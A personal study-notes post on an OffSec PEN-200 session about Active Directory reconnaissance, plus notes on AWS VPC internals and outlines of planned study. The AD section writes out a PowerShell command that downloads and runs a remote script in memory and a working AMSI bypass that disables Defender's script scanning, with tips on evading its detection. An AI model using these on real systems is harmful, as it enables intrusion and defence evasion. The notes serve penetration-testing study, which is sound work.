# OffSec Live: PEN-200 & AWS Deep Dive

author:: Nathan Acks  
date:: 2022-08-24

Notes from OffSec Live in the morning (as usual), and then a few more YouTube videos about AWS this evening.

## OffSec Live: PEN-200 — Active Directory Reconnaissance

* The Windows `whoami` supports a lot of flags. For example, `whoami /privs` returns privilege information, while `whoami /all` returns *tons* of information about the current user.
* The Windows host name will be returned by the `hostname` command.
* The Windows `systeminfo` command returns *a lot* of information about the current computer, including the associated domain controller if it’s domain-joined.
* Use `net users` to enumerate all local users on Windows.
* Use `net users /domain` to enumerate domain users. `Administrator`, `Guest`, and `krbtgt` are all standard Windows domain users.
* Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name (and comparing the output of `whoami` and `hostname` will reveal if you’re logged in with a local or domain account).
* When viewing information about a Windows user, `net user $USERNAME` will return *local* user information, while `net user $USERNAME /domain` *domain* user information.
* Local and domain groups can be enumerated in Windows using `net localgroup` and `net group /domain`.
* See all Windows administrators for the local system: `net localgroup administrators`
* By default, all members of the `Domain Admins` domain group are admins of both the *domain* and *all* machines in that domain.
* One way to show domain group membership is to use `net group $GROUP /domain`. However, this *doesn’t* show domain groups that are members of that group; for this you need to use PowerShell.
* The `Get-DomainUsers | select name, memberof` PowerShell command will get domain users and associated groups.
* The `Get-DomainGroupMember -Identity $GROUP_NAME` PowerShell command will get all domain group members, *including* nested domain groups.
* The `Get-NetLoggedon | select UserName` PowerShell command will show all users that previously logged on to the current machine. It requires administrative privileges to be run against remote machines.
* The `Get-NetSession` PowerShell command will show all users who are logged in to the current machine *right now*. It can be called *without* admin privileges from Windows Server systems.
* A good enumeration tool is `PowerView.ps1`. For example, it includes the `Invoke-UserHunter` command that bundles up `Get-NetLoggedon` and `Get-NetSession` to hunt for currently logged in domain admins.
* You can download a remote script into memory and execute it using PowerShell using `IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")`. You can also load scripts into variables this way (just replace `IEX` with a variable assignment).
* Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts). However, there’s a lot of bypasses for this — for example, you can cause the AMSI init function to error out using `[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`.
* AMSI traps all PowerShell commands that contain all AMSI-function related strings, however. The search uses regular expressions, and can be bypassed by putting portions of the script you’re trying to call in variables, and then calling these instead. If you really need a one-liner, you can also do some fancy hex code conversion (see the “Bypass AMSI by manual modification” link).
* Be aware that AMSI bypasses are *per session*, not global!

### References

* [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
* [Join OffSec Live](https://learn.offensive-security.com/offsec-live-webinars)
* [PowerShellEmpire / PowerTools / PowerView / powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)

## Another Day, Another Billion Packets

* VPC was originally created to help *Amazon* migrate their data centers to AWS.
* EC2 originally just assigned new instances random IP addresses in the 10.44.x.x range. Every new instance got its own IP address, and there was no concept of unified subnets.
* VPCs solve this! Every VPC gets a non-routable network that you choose. VPC subnets can be anything, so long as they (1) don’t overlap and (2) are entirely contained within the VPC network.
* VPCs are *not* VLAN based — there are at most 4096 separate VLAN tags.
* VPCs are identified internally with a 128 bit number (8 hex digits).
* The VPC mapping service is basically an ARP cache on steroids that understands what EC2 instances and VPCs *are* and on which physical servers the instances are located. But the mapping service doesn’t *just* provide L2 information — servers receiving packets also verify that those packets are authentic (that the packet’s server/instance/VPC tuple matches an existing system).
* The mapping service also functions as a “virtual gateway”, providing routing information *between* subnets. One interesting consequence of this is that, while in a traditional network inter- and intra-network routing looks slightly different, in AWS this routing is *exactly* the same once packets leave a physical server. L2 and L3 routing are essentially unified within AWS.
* In practice, the every server contains a dedicated system that caches from the mapping service. In fact, these devices *pro-actively* cache from the mapping service as instances are spun up within a VPN. *All queries are handled by these caches.*
* There are two types of caches — caches to individual hosts (EC2) instances, and caches to “edges”, which map to other networks. Direct Connect, VPNs, and internet gateways are implemented at edges.
* Edges also function as a 1-to-1 NAT in their role as internet gateways.
* Edge devices are called “Blackfoot”, after the South African Blackfoot Penguin.
* The last non-AWS Amazon web server was deactivated on November 10, 2010. Since then, Amazon has run 100% on AWS. And Amazon uses the same EC2 instances as everyone else.
* Edges can also now route to S3, enabling S3 buckets to be exposed *privately* within a VPC. Packets routed to S2 buckets configured in this fashion *never* traverse the public internet — they go out to an edge device and then are routed from there to S3.
* S3 buckets can be restricted to particular VPCs, and EC2 instances can be restricted to accessing particular EC2 buckets. All of this is done with the standard Amazon (“Aspen”) policy document structure.
* 

### References

* [AWS re:Invent 2015: Another Day, Another Billion Packets (YouTube)](https://youtu.be/R-n4dDGfQd4)

<!--

## A Serverless Journey: AWS Lambda Under the Hood

* 

### References

* [AWS re:Invent 2018: A Serverless Journey — AWS Lambda Under the Hood (YouTube)](https://youtu.be/3qln2u1Vr2E)

## Introduction to the AWS CLI

* 

### References

* [AWS re:Invent 2017: Introduction to the AWS CLI (YouTube)](https://youtu.be/QdzV04T_kec)

## HTTP Desync Attacks

* 

### References

* [HTTP Desync Attacks: Smashing into the Cell Next Door (DEF CON 27)](https://www.youtube.com/watch?v=w-eJM2Pc0KI)

## AWS IAM Policies in a Nutshell

* 

### References

* [AWS IAM Policies in a Nutshell](https://start.jcolemorrison.com/aws-iam-policies-in-a-nutshell/)

## AWS IAM Privilege Escalation: Methods and Mitigation

* 

### References

* [AWS IAM Privilege Escalation — Methods and Mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

## Amazon API Gateway

* 

### References

* [Amazon API Gateway: Developer Guide](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html)

## AWS KMS Cryptographic Details

* 

### References

* [AWS KMS Cryptographic Details](https://docs.aws.amazon.com/kms/latest/cryptographic-details/intro.html)

## AWS Well-Architected Framework

* 

### References

* [AWS Well-Architected Framework](https://docs.aws.amazon.com/wellarchitected/latest/framework/welcome.html)

## Signature Version 4 Signing Process

* 

### References

* [Signature Version 4 signing process](https://docs.aws.amazon.com/general/latest/gr/signature-version-4.html)

## AWS Networking Example

* 

### References

* [AWS — Networking Example](https://ardsec.blogspot.com/2018/09/networking-in-aws.html)

## AWS Developer Tools

* 

### References

* [AWS — Developer Tools](https://ardsec.blogspot.com/2018/09/devops-in-aws.html)

## AWS Compute Services

* 

### References

* [AWS — Compute Services](https://ardsec.blogspot.com/2019/05/aws-compute-services.html)

## AWS Container Services

* 

### References

* [AWS — Container Services](https://ardsec.blogspot.com/2019/05/aws-compute-container-services.html)

## AWS Storage Services

* 

### References

* [AWS — Storage Services](https://ardsec.blogspot.com/2019/05/aws-storage-services.html)

## AWS Database Services

* 

### References

* [AWS — Database Services](https://ardsec.blogspot.com/2019/05/aws-database-services.html)

## AWS Migration Services

* 

### References

* [AWS — Migration Services](https://ardsec.blogspot.com/2019/05/aws-migration-service.html)

## AWS Networking Services

* 

### References

* [AWS — Networking Services](https://ardsec.blogspot.com/2019/05/aws-networking-services.html)

## AWS Security, Identity, and Compliance

* 

### References

* [AWS — Security, Identity, and Compliance](https://ardsec.blogspot.com/2019/06/aws-security-identity-and-compliance.html)

-->

<!-- (Walk through Learning Path 2 on the internal wiki.) -->

<!-- Finish up the TryHackMe: Jr. Penetration Tester “Supplements” -->

<!--

## PortSwigger Web Security Academy

(There are 210 total labs. I should try to do them all.)

(Maybe I should just get the Burp Suite Certified Practitioner at this point? See: <https://portswigger.net/web-security/certification>.)

REFERENCES:

* [PortSwigger: Web Security Academy](https://portswigger.net/web-security/learning-path)

### SQL Injection

### Authentication

### Directory Traversal

### Command Injection

### Business Logic Vulnerabilities

### Information Disclosure

### Access Control

### File Upload Vulnerabilities

### Server-Side Request Forgery (SSRF)

### XXE Injection

### Cross-Site Scripting (XSS)

### Cross-Site Request Forgery (CSRF)

### Cross-Origin Resource Sharing (CORS)

### Clickjacking

### DOM-Based Vulnerabilites

### WebSockets

### Insecure Deserialization

### Server-Side Template Injection

### Web Cache Poisoning

### HTTP Host Header Attacks

### HTTP Request Smuggling

### OAuth Authentication

-->

<!-- Resume my normally planned learning path. -->